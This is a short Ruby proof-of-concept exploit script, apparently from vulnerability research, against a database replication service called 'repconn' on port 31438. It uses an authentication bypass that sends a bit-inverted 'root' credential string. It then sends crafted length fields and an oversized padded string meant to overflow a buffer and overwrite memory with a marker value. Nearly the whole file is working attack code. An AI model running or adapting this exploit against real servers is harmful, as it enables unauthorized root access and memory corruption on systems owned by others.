# Encoding: ASCII-8BIT

require 'base64'
require 'pp'

require_relative './libneptune'

def usage
  puts "Usage: #{ $0 } <host> [port]"
  puts
  puts "Eg:"
  puts
  puts "ruby #{ $0 } 10.0.0.198 31438"
  exit
end

HOST = ARGV[0] || usage()
PORT = ARGV[1] || "31438"

# Connect to the target
connection = LibNeptune::new(HOST, PORT)

puts "Connecting to 'repconn' service:"
connection.send_recv(
  args: [
    # Service name
    { type: :string, value: 'unirep82' },

    # "SSL Flag" - must be non-zero if the service is started in "secure-only" mode (-s)
    { type: :integer, value: 1337 },
  ],
)

connection.send_recv(
  args: [
    { type: :string, value: ":local:" },

    # Use auth bypass
    { type: :string, value: "root:0:1234".bytes.map { |b| (0x0FF & (~b)).chr }.join },
  ],
)

DATA = "A" + # Length of the first string read from the string value
  "B" + # Length of the second string read from the string value
  "CD" + # Ignored, I think?
  "\x01\x00" + # Length of the third read (overflow-able)
  "\x01\x00" + # Another length field
  "\x03\x00" + # Memory is allocated based on this: (n * 0x298) + 0x4b8
  "\x00\x00" + # This needs to be lower then the previous value, not sure what else it does

  "MNOPQRSTUVWXYZabcdef"
connection.send_recv(
  args: [
    { type: :integer, value: 0x1337 },
    { type: :bytes, value: DATA },
    { type: :string, value: "A" * (512+4152) + "BBBBBBBB" },
  ],
)
